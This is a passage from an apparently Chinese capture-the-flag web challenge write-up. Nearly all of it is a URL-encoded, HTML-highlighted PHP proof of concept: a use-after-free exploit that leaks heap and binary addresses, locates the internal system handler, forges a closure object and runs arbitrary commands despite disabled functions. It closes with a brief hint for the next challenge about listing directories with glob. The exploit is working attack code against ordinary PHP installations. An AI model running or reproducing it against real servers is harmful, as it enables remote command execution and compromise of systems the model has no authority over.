class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">class</span>+<span class="title">Helper</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%2<span class="title">c</span>+%24<span class="title">b</span>%2<span class="title">c</span>+%24<span class="title">c</span>%2<span class="title">c</span>+%24<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">str2ptr</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">address</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">j</span>+%3<span class="title">d</span>+%24<span class="title">s</span>-1%3<span class="title">b</span>+%24<span class="title">j</span>+%3<span class="title">e</span>%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">j</span>--)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%3<span class="title">c</span>%3<span class="title">c</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">address</span>+%7<span class="title">c</span>%3<span class="title">d</span>+<span class="title">ord</span>(%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>%2<span class="title">b</span>%24<span class="title">j</span>%5<span class="title">d</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">address</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">ptr2str</span>(%24<span class="title">ptr</span>%2<span class="title">c</span>+%24<span class="title">m</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">out</span>+%3<span class="title">d</span>+%22%22%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>+(%24<span class="title">i</span>%3<span class="title">d0</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">m</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">out</span>+.%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">ptr</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">ptr</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">out</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">write</span>(%26%24<span class="title">str</span>%2<span class="title">c</span>+%24<span class="title">p</span>%2<span class="title">c</span>+%24<span class="title">v</span>%2<span class="title">c</span>+%24<span class="title">n</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">str</span>%5<span class="title">b</span>%24<span class="title">p</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">sprintf</span>(%27%25<span class="title">c</span>%27%2<span class="title">c</span>%24<span class="title">v</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">v</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">global</span>+%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">addr</span>+%2<span class="title">b</span>+%24<span class="title">p</span>+-+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">strlen</span>(%24<span class="title">helper</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(%24<span class="title">s</span>+!%3<span class="title">d</span>+8)+%7<span class="title">b</span>+%24<span class="title">leak</span>+%25%3<span class="title">d</span>+2+%3<span class="title">c</span>%3<span class="title">c</span>+(%24<span class="title">s</span>+*+8)+-+1%3<span class="title">b</span>+%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">leak</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_type</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phoff</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phentsize</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x36</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phnum</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x38</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">e_phnum</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">header</span>+%3<span class="title">d</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">e_phoff</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+%24<span class="title">e_phentsize</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_type</span>++%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_flags</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+4%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_vaddr</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_memsz</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x28</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+6)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_Write</span>%0<span class="title">a</span>++++++++++++++++%23+<span class="title">handle</span>+<span class="title">pie</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_addr</span>+%3<span class="title">d</span>+%24<span class="title">e_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+2+%3<span class="title">f</span>+%24<span class="title">p_vaddr</span>+%3<span class="title">a</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">p_vaddr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+5)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_exec</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">text_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(!%24<span class="title">data_addr</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">text_size</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">data_size</span>)%0<span class="title">a</span>++++++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%5<span class="title">b</span>%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">list</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>)+%3<span class="title">d</span>+%24<span class="title">elf</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">data_size</span>+%2<span class="title">f</span>+8%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">i</span>+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">constant</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x746e6174736e6f63</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+(%24<span class="title">i</span>+%2<span class="title">b</span>+4)+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">bin2hex</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x786568326e6962</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">return</span>+%24<span class="title">data_addr</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">base</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">start</span>+%3<span class="title">d</span>+%24<span class="title">binary_leak</span>+%26+0<span class="title">xfffffffffffff000</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x1000</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">start</span>+-+0<span class="title">x1000</span>+*+%24<span class="title">i</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+7)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x10102464c457f</span>)+%7<span class="title">b</span>+%23+<span class="title">ELF</span>+<span class="title">header</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+%24<span class="title">addr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">basic_funcs</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">do</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_entry</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_name</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">f_entry</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">f_name</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x6d6574737973</span>)+%7<span class="title">b</span>+%23+<span class="title">system</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+<span class="title">leak</span>(%24<span class="title">addr</span>+%2<span class="title">b</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%2<span class="title">b</span>%3<span class="title">d</span>+0<span class="title">x20</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>+<span class="title">while</span>(%24<span class="title">f_entry</span>+!%3<span class="title">d</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">trigger_uaf</span>(%24<span class="title">arg</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%23+<span class="title">str_shuffle</span>+<span class="title">prevents</span>+<span class="title">opcache</span>+<span class="title">string</span>+<span class="title">interning</span>%0<span class="title">a</span>++++++++%24<span class="title">arg</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Vuln</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>-%3<span class="title">ea</span>+%3<span class="title">d</span>+%24<span class="title">arg</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">stristr</span>(<span class="title">PHP_OS</span>%2<span class="title">c</span>+%27<span class="title">WIN</span>%27))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%27<span class="title">This</span>+<span class="title">PoC</span>+<span class="title">is</span>+<span class="title">for</span>+*<span class="title">nix</span>+<span class="title">systems</span>+<span class="title">only</span>.%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">n_alloc</span>+%3<span class="title">d</span>+10%3<span class="title">b</span>+%23+<span class="title">increase</span>+<span class="title">this</span>+<span class="title">value</span>+<span class="title">if</span>+<span class="title">UAF</span>+<span class="title">fails</span>%0<span class="title">a</span>++++%24<span class="title">contiguous</span>+%3<span class="title">d</span>+%5<span class="title">b</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n_alloc</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)%0<span class="title">a</span>++++++++%24<span class="title">contiguous</span>%5<span class="title">b</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">trigger_uaf</span>(%27<span class="title">x</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc</span>+%3<span class="title">d</span>+%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>%5<span class="title">b0</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>-%3<span class="title">eb</span>+%3<span class="title">d</span>+<span class="title">function</span>+(%24<span class="title">x</span>)+%7<span class="title">b</span>+%7<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+79+%7<span class="title">c</span>%7<span class="title">c</span>+<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+0)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">UAF</span>+<span class="title">failed</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">leaks</span>%0<span class="title">a</span>++++%24<span class="title">closure_handlers</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">php_heap</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x58</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc_addr</span>+%3<span class="title">d</span>+%24<span class="title">php_heap</span>+-+0<span class="title">xc8</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">value</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x60</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x70</span>%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">reference</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+0<span class="title">x60</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x18</span>%2<span class="title">c</span>+0<span class="title">xa</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">closure_obj</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">binary_leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">closure_handlers</span>%2<span class="title">c</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">base</span>+%3<span class="title">d</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">determine</span>+<span class="title">binary</span>+<span class="title">base</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">elf</span>+%3<span class="title">d</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">parse</span>+<span class="title">ELF</span>+<span class="title">header</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">basic_funcs</span>+%3<span class="title">d</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">basic_functions</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">zif_system</span>+%3<span class="title">d</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">zif_system</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">closure</span>+<span class="title">object</span>%0<span class="title">a</span>++++%24<span class="title">fake_obj_offset</span>+%3<span class="title">d</span>+0<span class="title">xd0</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x110</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%2<span class="title">b</span>%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">fake_obj_offset</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">c</span>+<span class="title">leak</span>(%24<span class="title">closure_obj</span>%2<span class="title">c</span>+%24<span class="title">i</span>))%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">pwn</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+%24<span class="title">fake_obj_offset</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x38</span>%2<span class="title">c</span>+1%2<span class="title">c</span>+4)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">type</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">zif_system</span>)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">handler</span>%0<span class="title">a</span>%0<span class="title">a</span>++++(%24<span class="title">helper</span>-%3<span class="title">eb</span>)(%24<span class="title">cmd</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">exit</span>()%3<span class="title">b</span>%0<span class="title">a</span>%7<span class="title">d</span></span></span><br></pre></td></tr></table></figure>
<h1 id="web73"><a class="markdownIt-Anchor" href="#web73">#</a> Web73：</h1>
<p>​		又是，没源码，那就 glob 遍历文件目录吧，当然 var_export 也可以做到这里没有被 ban：</p>
